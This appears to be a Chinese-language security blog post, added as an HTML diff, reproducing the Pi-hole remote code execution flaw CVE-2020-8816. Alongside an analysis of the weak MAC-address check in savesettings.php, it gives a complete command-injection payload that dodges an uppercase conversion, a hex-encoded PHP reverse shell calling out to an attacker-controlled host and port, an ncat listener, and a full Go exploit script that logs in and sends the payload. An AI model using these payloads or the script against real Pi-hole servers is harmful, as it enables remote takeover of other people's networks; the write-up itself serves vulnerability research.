@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="（CVE 2020-8816）Pi-hole 远程代码执行漏洞一、漏洞简介二、漏洞影响Pi-hole &lt;&#x3D; 4.3.2 三、复现过程漏洞分析 .&#x2F;scripts&#x2F;pi-hole&#x2F;php&#x2F;savesettings.php  &amp;#123;   &#x2F;&#x2F; Accepted input format: 00:01:02:1A:5F:FF (characters may be lower case)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Pi-hole/%EF%BC%88CVE%202020-8816%EF%BC%89Pi-hole%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="（CVE 2020-8816）Pi-hole 远程代码执行漏洞一、漏洞简介二、漏洞影响Pi-hole &lt;&#x3D; 4.3.2 三、复现过程漏洞分析 .&#x2F;scripts&#x2F;pi-hole&#x2F;php&#x2F;savesettings.php  &amp;#123;   &#x2F;&#x2F; Accepted input format: 00:01:02:1A:5F:FF (characters may be lower case)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE2020-8816)Pi-hole%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE2020-8816)Pi-hole%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE2020-8816)Pi-hole%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId31.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE2020-8816)Pi-hole%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId33.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE2020-8816)Pi-hole%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId34.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE2020-8816)Pi-hole%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId35.png">
+<meta property="article:published_time" content="2022-07-08T06:26:02.568Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.404Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/(CVE2020-8816)Pi-hole%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Pi-hole/（CVE 2020-8816）Pi-hole 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Pi-hole/%EF%BC%88CVE%202020-8816%EF%BC%89Pi-hole%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.568Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-8816）Pi-hole-远程代码执行漏洞"><a href="#（CVE-2020-8816）Pi-hole-远程代码执行漏洞" class="headerlink" title="（CVE 2020-8816）Pi-hole 远程代码执行漏洞"></a>（CVE 2020-8816）Pi-hole 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Pi-hole &lt;= 4.3.2</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><blockquote>
+<p>./scripts/pi-hole/php/savesettings.php</p>
+</blockquote>
+<pre><code>&#123;
+  // Accepted input format: 00:01:02:1A:5F:FF (characters may be lower case)
+  return (preg_match(&#39;/([a-fA-F0-9]&#123;2&#125;[:]?)&#123;6&#125;/&#39;, $mac_addr) == 1);    
+&#125;
+
+$mac = $_POST[&quot;AddMAC&quot;];
+
+if(!validMAC($mac)) &#123;...&#125;
+
+$mac = strtoupper($mac);
+
+if(isset($_POST[&quot;addstatic&quot;])) &#123;
+    ...
+    exec(&quot;sudo pihole -a addstaticdhcp &quot;.$mac.&quot; &quot;.$ip.&quot; &quot;.$hostname);
+    ...
+&#125;
+
+if(isset($_POST[&quot;removestatic&quot;])) &#123;
+    ...
+    exec(&quot;sudo pihole -a removestaticdhcp &quot;.$mac);
+    ...
+&#125;
+</code></pre>
+<p>注意到，在validMAC函数中，只使用preg_match对MAC地址的格式进行了检查，而preg_match函数的作用是根据正则表达式的模式对字符串进行搜索匹配，并返回匹配字数。因此，只要用户的输入中存在MAC地址，就可以通过检查。</p>
+<p>通过检查的用户输入做了一次大写转换，然后直接放入了exec函数中。</p>
+<p><strong>最终的payload</strong></p>
+<pre><code>aaaaaaaaaaaa&amp;&amp;SHORT=$&#123;PATH##/***:/&#125;&amp;&amp;A=$&#123;SHORT#???&#125;&amp;&amp;P=$&#123;A%/???&#125;&amp;&amp;B=$&#123;PWD#/???/???/&#125;&amp;&amp;H=$&#123;B%???/?????&#125;&amp;&amp;C=$&#123;PWD#/??&#125;&amp;&amp;R=$&#123;C%/???/????/?????&#125;&amp;&amp;$P$H$P$IFS-$R$IFS&#39;EXEC(HEX2BIN(&quot;706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27&quot;));&#39;&amp;&amp;
+</code></pre>
+<h4 id="payload分析"><a href="#payload分析" class="headerlink" title="payload分析"></a>payload分析</h4><ul>
+<li>  1、模拟MAC地址</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>aaaaaaaaaaaa
+</code></pre>
+<p>根据源码中的validMAC()函数，我们得知程序会对用户输入做一个基本的MAC地址格式判断，只要由12个字母或数字组成，就可以通过验证。</p>
+<ul>
+<li>  2、获取p,h,r的小写字符</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>SHORT=$&#123;PATH##/***:/&#125;&amp;&amp;A=$&#123;SHORT#???&#125;&amp;&amp;P=$&#123;A%/???&#125;&amp;&amp;B=$&#123;PWD#/???/???/&#125;&amp;&amp;H=$&#123;B%???/?????&#125;&amp;&amp;C=$&#123;PWD#/??&#125;&amp;&amp;R=$&#123;C%/???/????/?????&#125;
+</code></pre>
+<p>原本的payload应该为：</p>
+<pre><code>aaaaaaaaaaaa&amp;&amp;php -r ‘$sock=fsockopen(“target.0-sec.org”,2256);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’
+</code></pre>
+<p>但是由于程序会对用户输入做一个大写转换，因此，php -r会变成PHP<br>-R，命令无法识别，因此需要找到一种方式获取p、h、r的小写字符。</p>
+<p>可以使用环境变量，变量名都是大写字母，而变量值中可能包含各种小写字母。</p>
+<p>在浏览器中进入<a target="_blank" rel="noopener" href="http://www.0-sec.org/admin%EF%BC%8C%E7%99%BB%E9%99%86%E5%90%8E%EF%BC%8C%E9%80%89%E6%8B%A9Setting-/&gt;DHCP%E9%80%89%E9%A1%B9%E5%8D%A1%EF%BC%8C%E5%85%88%E8%AF%95%E4%B8%80%E4%B8%8BPATH%E5%8F%98%E9%87%8F%EF%BC%8C%E8%BE%93%E5%85%A5aaaaaaaaaaaa/$PATH%EF%BC%8C%E7%BB%93%E6%9E%9C%E6%98%BE%E7%A4%BA%EF%BC%9A">http://www.0-sec.org/admin，登陆后，选择Setting-\&gt;DHCP选项卡，先试一下PATH变量，输入aaaaaaaaaaaa\$PATH，结果显示：</a></p>
+<p><img src="/resource/(CVE2020-8816)Pi-hole%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png" alt="1.png"></p>
+<p>很遗憾，没有h字符，看来还需要找其他环境变量。我在env命令的执行结果中找到了PWD变量，输入试一下：</p>
+<p><img src="/resource/(CVE2020-8816)Pi-hole%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId27.png" alt="2.png"></p>
+<p>里面有h和r，所以，我可以使用PATH和PWD两个环境变量，获得p、h、r这几个字符。</p>
+<p>我使用了<a target="_blank" rel="noopener" href="https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html">Shell参数扩展</a>对这两个变量值进行截取：</p>
+<pre><code>p:
+    SHORT=$&#123;PATH##/***:/&#125;&amp;&amp;A=$&#123;SHORT#???&#125;&amp;&amp;P=$&#123;A%/???&#125;
+h:
+    B=$&#123;PWD#/???/???/&#125;&amp;&amp;H=$&#123;B%???/?????&#125;
+r:
+    C=$&#123;PWD#/??&#125;&amp;&amp;R=$&#123;C%/???/????/?????&#125;
+</code></pre>
+<p>根据<a target="_blank" rel="noopener" href="https://www.gnu.org/software/bash/manual/html_node/Pattern-Matching.html#Pattern-Matching">模式匹配</a>的规则，应该可以写出更简洁的方法，但是我的系统中好多shell选项都没有开启，考虑到通用性，我就直接选择了最傻瓜的匹配方式。</p>
+<p>3、获得反向shell</p>
+<pre><code>$P$H$P$IFS-$R$IFS&#39;EXEC(HEX2BIN(&quot;706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27&quot;));&#39;
+</code></pre>
+<p>先把变量换成对应的字符，注意上面的<code>$IFS</code>是shell的一个内定变量，默认为<code>&lt;space&gt;&lt;tab&gt;&lt;newline&gt;</code>，这里代替空格。</p>
+<pre><code>php -r &#39;exec(hex2bin(&quot;706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27&quot;))&#39;
+</code></pre>
+<p>然后替换<code>hex2bin</code>的执行结果（转义符是我后加的）：</p>
+<pre><code>php -r &#39;exec(php -r \&#39;$sock=fsockopen(&quot;target.0-sec.org&quot;,2256);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);\&#39;)&#39;
+</code></pre>
+<p>这段代码就可以获得一个反向shell。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在主机的命令行中输入：</p>
+<pre><code>ncat -nlvp 2256
+</code></pre>
+<p>进入监听模式，等待其他机器的连接。</p>
+<p>返回虚拟机，在浏览器中打开<code>http://192.168.1.107/admin</code>，登录，选择Setting-&gt;DHCP选项卡，输入payload：</p>
+<pre><code>aaaaaaaaaaaa&amp;&amp;SHORT=$&#123;PATH##/***:/&#125;&amp;&amp;A=$&#123;SHORT#???&#125;&amp;&amp;P=$&#123;A%/???&#125;&amp;&amp;B=$&#123;PWD#/???/???/&#125;&amp;&amp;H=$&#123;B%???/?????&#125;&amp;&amp;C=$&#123;PWD#/??&#125;&amp;&amp;R=$&#123;C%/???/????/?????&#125;&amp;&amp;$P$H$P$IFS-$R$IFS&#39;EXEC(HEX2BIN(&quot;706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27&quot;));&#39;&amp;&amp;
+</code></pre>
+<p>返回主机，可以看到主机收到了连接，可以执行命令了：<img src="/resource/(CVE2020-8816)Pi-hole%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId31.png" alt="3.png"></p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><blockquote>
+<p>CVE-2020-8816.go</p>
+</blockquote>
+<p><code>go run CVE-2020-8816.go -host $LHOST -p $LPORT -pass admin -u http://www.0-sec.org/admin/</code></p>
+<p><code>./CVE-2020-8816 -host $LHOST -p $LPORT -pass admin -u http://www.0-sec.org/admin/</code></p>
+<p><img src="/resource/(CVE2020-8816)Pi-hole%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId33.png" alt="4.png"></p>
+<p><img src="/resource/(CVE2020-8816)Pi-hole%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId34.png" alt="5.png"></p>
+<p><img src="/resource/(CVE2020-8816)Pi-hole%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId35.png" alt="6.png"></p>
+<pre><code>package main
+
+
+import (
+    &quot;flag&quot;
+    &quot;log&quot;
+    &quot;strings&quot;
+    &quot;github.com/anaskhan96/soup&quot;
+    &quot;encoding/hex&quot;
+    &quot;github.com/levigross/grequests&quot;
+)
+
+type Options struct &#123;
+    url, password, host, port string
+   
+&#125;
+
+
+var HOST string
+var URL string
+var PORT string
+var PASSWD string
+
+func generate_shell() string&#123;
+    payload := &quot;php -r &#39;$sock=fsockopen(\&quot;HOST\&quot;, PORT);exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);&#39;&quot;
+    payload = strings.Replace(payload, &quot;HOST&quot;, HOST, 1)
+    payload = strings.Replace(payload, &quot;PORT&quot;, PORT, 1)
+    return hex.EncodeToString([]byte(payload))
+&#125;
+
+func extractFlags() *Options &#123;
+    urlPtr := flag.String(&quot;u&quot;, &quot;http://10.0.0.1/admin/&quot;, &quot;Set the Url of the admin panel&quot;)
+    passPtr := flag.String(&quot;pass&quot;, &quot;admin&quot;, &quot;Admin Password&quot;)
+    hostPtr := flag.String(&quot;host&quot;, &quot;10.0.0.1&quot;, &quot;Set the host for the reverse shell&quot;)
+    portPtr := flag.String(&quot;p&quot;, &quot;1337&quot;, &quot;Set Port for the reverse shell&quot;)
+    flag.Parse()
+
+    return &amp;Options&#123;*urlPtr, *passPtr, *hostPtr,*portPtr&#125;
+&#125;
+
+func doLogin(ses *grequests.Session) *grequests.Session&#123;
+    log.Println(&quot;Logging In...&quot;)
+    resp, err := ses.Post(URL+&quot;index.php&quot;,&amp;grequests.RequestOptions&#123;Data: map[string]string&#123;&quot;pw&quot;: PASSWD&#125;&#125;)
+    if err != nil &#123;
+        log.Fatal(&quot;Error logging-in: &quot;, err)
+    &#125;
+
+    if resp.Ok != true &#123;
+        log.Println(&quot;Request for log-in did not return OK&quot;)
+    &#125;
+    log.Println(&quot;Logged In!&quot;)
+    return ses
+&#125;
+
+func getToken(ses *grequests.Session) string&#123;
+    resp, err:= ses.Get(URL+&quot;index.php&quot;,nil)
+        if err != nil &#123;
+        log.Fatal(&quot;Error getting token: &quot;, err)
+    &#125;
+
+    if resp.Ok != true &#123;
+        log.Println(&quot;Request for getting token did not return OK&quot;)
+    &#125;
+    html := soup.HTMLParse(resp.String())
+    token := html.Find(&quot;div&quot;,&quot;id&quot;,&quot;token&quot;).Text()
+    return token
+&#125;
+
+func Exploit(ses *grequests.Session, token string, payload string) &#123;
+    full_payload := &quot;aaaaaaaaaaaa&amp;&amp;W=$&#123;PATH#/???/&#125;&amp;&amp;P=$&#123;W%%?????:*&#125;&amp;&amp;X=$&#123;PATH#/???/??&#125;&amp;&amp;H=$&#123;X%%???:*&#125;&amp;&amp;Z=$&#123;PATH#*:/??&#125;&amp;&amp;R=$&#123;Z%%/*&#125;&amp;&amp;$P$H$P$IFS-$R$IFS&#39;EXEC(HEX2BIN(\&quot;&quot; + payload + &quot;\&quot;));&#39;&amp;&amp;&quot;
+    resp,err := ses.Post(URL + &quot;settings.php&quot;, &amp;grequests.RequestOptions&#123;Data: map[string]string&#123;
+        &quot;AddMAC&quot;:full_payload,
+        &quot;field&quot;:&quot;DHCP&quot;,
+        &quot;AddIP&quot;:&quot;10.10.10.10&quot;, 
+        &quot;AddHostname&quot;:&quot;10.10.10.10&quot;, 
+        &quot;addstatic&quot;:&quot;&quot;, 
+        &quot;token&quot;:token&#125;&#125;)
+            if err != nil &#123;
+        log.Fatal(&quot;Error sending payload: &quot;, err)
+    &#125;
+
+    if resp.Ok != true &#123;
+        log.Println(&quot;Request for sending payload did not return OK&quot;)
+    &#125;
+&#125;
+
+
+func main()&#123;
+    options := extractFlags()
+    HOST = options.host
+    URL = options.url
+    PORT = options.port
+    PASSWD = options.password 
+    session := grequests.NewSession(nil)
+    doLogin(session)
+    log.Println(&quot;Getting Token...&quot;)
+    token := getToken(session)
+    log.Println(&quot;Token:&quot;,token)
+    log.Println(&quot;Generating payload...&quot;)
+    payload := generate_shell()
+    log.Println(&quot;Payload generated:&quot;,payload)
+    log.Println(&quot;Sending exploit...&quot;)
+    Exploit(session, token, payload)
+    log.Println(&quot;Exploit executed, check your session&quot;)
+&#125;
+</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/234533.html">https://www.freebuf.com/vuls/234533.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/team0se7en/CVE-2020-8816/blob/master/CVE-2020-8816.go">https://github.com/team0se7en/CVE-2020-8816/blob/master/CVE-2020-8816.go</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Pi-hole/%EF%BC%88CVE%202020-8816%EF%BC%89Pi-hole%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2quuw00eyy8v190fa7lsk" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Pi-hole/%EF%BC%88CVE-2019-13051%EF%BC%89Pi-Hole%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/PhpYun/Phpyun%20v5.0.1%20%E5%90%8E%E5%8F%B0getshell/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
